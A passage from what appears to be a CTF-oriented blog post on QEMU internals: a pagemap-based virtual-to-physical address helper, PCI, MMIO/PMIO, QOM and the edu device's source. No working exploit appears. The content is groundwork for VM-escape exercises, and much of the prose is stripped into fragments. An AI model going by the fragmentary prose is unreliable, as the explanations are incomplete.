class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 12</span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  page frame number</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, SEEK_SET);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address  phycial address</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = <span class="built_in">gva_to_gfn</span>(addr);</span><br><span class="line">    <span class="built_in">assert</span>(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | <span class="built_in">page_offset</span>((<span class="type">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    ptr_mem = <span class="built_in">gva_to_gpa</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PCI"><a href="#PCI" class="headerlink" title="PCI"></a>PCI</h3><p><strong></strong>busCPU </p><p>PCI <code>Peripheral Component Interconnect</code><strong></strong> PCI bus  CPU   PCI  X86  PCI </p><p>PCI </p><ol><li><strong>PCI </strong>device PCI  PCI  PCI  PCI </li><li><strong>PCI </strong>bus PCI  PCI </li><li><strong>PCI </strong>bridge<strong></strong></li></ol><ul><li>HOST&#x2F;PCI  PCI  PCI  CPU  PCI <strong></strong> PC <strong></strong>North Bridge Chipset</li><li>PCI&#x2F;ISA  ISA  i8359A<strong></strong>South Bridge Chipset</li><li>PCI-to-PCI  PCI Primary BusSecondary Bus</li></ul><h4 id="mmio-memory-mapped-io"><a href="#mmio-memory-mapped-io" class="headerlink" title="mmio : memory mapped io"></a>mmio : memory mapped io</h4><p> IO IO </p><h4 id="pmio-port-mapped-io"><a href="#pmio-port-mapped-io" class="headerlink" title="pmio : port mapped io"></a>pmio : port mapped io</h4><p> IO IO  x86 <code>in</code><code>out</code>IO  CPU  isolated I&#x2F;O</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b: byte</span></span><br><span class="line"><span class="comment">// w: word 2 byte</span></span><br><span class="line"><span class="comment">// l: long 4 byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">inb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">inw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">inl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outb</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outl</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="pci"><a href="#pci" class="headerlink" title="pci"></a>pci</h4><p><a href="https://www.kernel.org/doc/html/next/translations/zh_CN/PCI/sysfs-pci.html">sysfsPCI</a></p><p>PCI  <code>PCIbridge classcode: deviceid:vendorid</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># lspci -v</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure><p><code>resource0</code>MMIO<code>resource1</code>PMIO0<code>resource</code><code>start-address end-address flags</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:03.0/resource</span></span><br><span class="line">0x00000000febc0000 0x00000000febdffff 0x0000000000040200</span><br><span class="line">0x000000000000c000 0x000000000000c03f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p><code>config</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ # hexdump -C  /sys/devices/pci0000:00/0000:00:04.0/config </span><br><span class="line">00000000  34 12 24 20 03 01 00 00  10 00 ff 00 00 00 00 00  |4.$ ............|</span><br><span class="line">00000010  00 10 bf fe 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000020  00 00 00 00 00 00 00 00  00 00 00 00 f4 1a 00 11  |................|</span><br><span class="line">00000030  00 00 00 00 00 00 00 00  00 00 00 00 0b 01 00 00  |................|</span><br><span class="line">00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000100</span><br></pre></td></tr></table></figure><h3 id="Qemu-Object-Model"><a href="#Qemu-Object-Model" class="headerlink" title="Qemu Object Model"></a>Qemu Object Model</h3><p>Qemu  C  OOP  Qemu <strong>Qemu Object Model</strong><a href="https://github.com/qemu/qemu/blob/master/include/qom/object.h">(3)</a></p><p> QOM <code>parent</code></p><ul><li><code>Type</code></li><li><code>Class</code></li><li><code>Object</code>instance</li><li><code>Property</code>accessor</li></ul><p>TypeInfo -&gt; TypeImpl -&gt; ObjectClass -&gt; Object Objectdeviceqemu<code>-device</code></p><h3 id="hw-misc-edu-c"><a href="#hw-misc-edu-c" class="headerlink" title="hw&#x2F;misc&#x2F;edu.c"></a>hw&#x2F;misc&#x2F;edu.c</h3><p><a href="https://ctf-wiki.org/pwn/virtualization/qemu/environment/build-qemu-dev/">CTF Wiki</a><a href="https://elixir.bootlin.com/qemu/v8.1.4/source">Qemu source code</a><a href="https://www.qemu.org/docs/master/devel/qom.html">QEMU documentation</a></p><p></p><ul><li>opaque: </li><li>State: </li></ul><h4 id="TypeInfo-"><a href="#TypeInfo-" class="headerlink" title="TypeInfo: "></a>TypeInfo: </h4><p>qemuTypeInfo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>edu</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_register_types</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> InterfaceInfo interfaces[] = &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo edu_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="built_in">sizeof</span>(EduState),</span><br><span class="line">        .instance_init = edu_instance_init,</span><br><span class="line">        .class_init    = edu_class_init,</span><br><span class="line">        .interfaces = interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">type_register_static</span>(&amp;edu_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>type_register()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type_register_static</span>(&amp;edu_info);</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type_init</span>(pci_edu_register_types)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> type_init(function) module_init(function, MODULE_INIT_QOM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(function, type)                                         \</span></span><br><span class="line"><span class="meta">static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \</span></span><br><span class="line"><span class="meta">&#123;                                                                           \</span></span><br><span class="line"><span class="meta">    register_module_init(function, type);                                   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="class-"><a href="#class-" class="headerlink" title="class: "></a>class: </h4><p>type_rigister :  TypeInfo  <code>TypeImpl</code>qemuTypeInfoTypeImpl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeImpl</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;                        <span class="comment">// ObjectClass </span></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>TypeImplclassqemutype_register_staticTypeImplqemutype_initializeObjectClasses</p><p>ObjectClassclass</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>educlass_initObjectClass</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_class_init</span><span class="params">(ObjectClass *<span class="keyword">class</span>, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line">    PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_edu_realize;</span><br><span class="line">    k-&gt;exit = pci_edu_uninit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e8</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    <span class="built_in">set_bit</span>(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Object<code>Type</code><code>ObjectClass</code><code>TypeInfo</code><code>instance_init</code><code>class_init</code><code>class_init</code><code>ObjectClass</code><code>instance_init</code><code>Object</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;</span><br><span class="line">    ObjectFree *free;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>class_initrealizePCIDevice</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(pdev);</span><br><span class="line">    <span class="type">uint8_t</span> *pci_conf = pdev-&gt;config;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pci_config_set_interrupt_pin</span>(pci_conf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">msi_init</span>(pdev, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="literal">false</span>, errp)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">timer_init_ms</span>(&amp;edu-&gt;dma_timer, QEMU_CLOCK_VIRTUAL, edu_dma_timer, edu);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">qemu_mutex_init</span>(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    <span class="built_in">qemu_cond_init</span>(&amp;edu-&gt;thr_cond);</span><br><span class="line">    <span class="built_in">qemu_thread_create</span>(&amp;edu-&gt;thread, <span class="string">&quot;edu&quot;</span>, edu_fact_thread,</span><br><span class="line">                       edu, QEMU_THREAD_JOINABLE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_io</span>(&amp;edu-&gt;mmio, <span class="built_in">OBJECT</span>(edu), &amp;edu_mmio_ops, edu,</span><br><span class="line">                    <span class="string">&quot;edu-mmio&quot;</span>, <span class="number">1</span> * MiB);</span><br><span class="line">    <span class="built_in">pci_register_bar</span>(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;edu-&gt;mmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>QOMObject<code>instace_size</code><code>instance_init</code>instace  Object </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(obj);</span><br><span class="line"></span><br><span class="line">    edu-&gt;dma_mask = (<span class="number">1UL</span> &lt;&lt; <span class="number">28</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">object_property_add_uint64_ptr</span>(obj, <span class="string">&quot;dma_mask&quot;</span>,</span><br><span class="line">                                   &amp;edu-&gt;dma_mask, OBJ_PROP_FLAG_READWRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>qemu<strong>MemoryRegion</strong><strong>MemoryRegion</strong><strong>MemoryRegionOps</strong></p><p> mmio  pmio</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps edu_mmio_ops = &#123;</span><br><span class="line">    .read = edu_mmio_read,</span><br><span class="line">    .write = edu_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">memory_region_init_io</span><span class="params">(MemoryRegion *mr,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Object *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> MemoryRegionOps *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">void</span> *opaque,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> <span class="type">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">uint64_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>opaque <code>State</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ObjectClass *<span class="title">object_class_dynamic_cast_assert</span><span class="params">(ObjectClass *<span class="keyword">class</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *<span class="keyword">typename</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *func)</span></span></span><br></pre></td></tr></table></figure><h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><p>CPUDMACPUCPU</p><p> GuestOS </p><p>write</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> MemTxResult <span class="title">pci_dma_read</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pci_dma_rw</span>(dev, addr, buf, len,</span><br><span class="line">                      DMA_DIRECTION_TO_DEVICE, MEMTXATTRS_UNSPECIFIED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p><a href="https://martins3.github.io/qemu/timer.html">QEMU </a></p><p>qemu</p><ul><li>QEMU_CLOCK_REALTIME </li><li>QEMU_CLOCK_VIRTUAL </li><li>QEMU_CLOCK_HOST </li><li>QEMU_CLOCK_VIRTUAL_RT icountQEMU_CLOCK_VIRTUALicountQEMU_CLOCK_VIRTUALcpu</li></ul><p>qemumain_loop_tlg  main loop  QEMUTimerListGroup, </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 